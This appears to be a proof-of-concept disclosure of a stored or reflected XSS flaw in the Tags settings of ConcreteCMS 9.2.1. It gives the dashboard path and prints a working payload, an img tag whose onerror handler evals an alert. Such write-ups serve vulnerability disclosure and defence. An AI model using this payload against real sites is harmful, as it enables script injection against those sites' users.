# ConcreteCMS Reflected XSS v.9.2.1

## Author: (Sergio)

**Description:** Cross Site Scripting vulnerability in ConcreteCMS v.9.2.1 allows a local attacker to execute arbitrary code via a crafted script to the Tags from Settings - Tags.

**Attack Vectors:** Scripting a vulnerability in the sanitization of the entry in the Tags of "Settings - Tags" allows injecting JavaScript code that will be executed when the user accesses the web page.

---

### POC:


When logging into the panel, we will go to the "Settings - Tags section off Dashboard Menu.

![image](https://github.com/sromanhu/ConcreteCMS-Reflected-XSS---Tags/assets/87250597/ae520664-dbef-4d6c-b5bf-dda4f200da10)




### XSS Payload:

```js
<img src=x:alert(alt) onerror=eval(src) alt='XSS Tags'>
```


In the following image you can see the embedded code that executes the payload in the main web.
![image](https://github.com/sromanhu/ConcreteCMS-Reflected-XSS---Tags/assets/87250597/b754705b-0d22-44ce-9a18-ffecfeb2903a)



</br>

### Additional Information:
https://www.concretecms.com/

https://owasp.org/Top10/es/A03_2021-Injection/
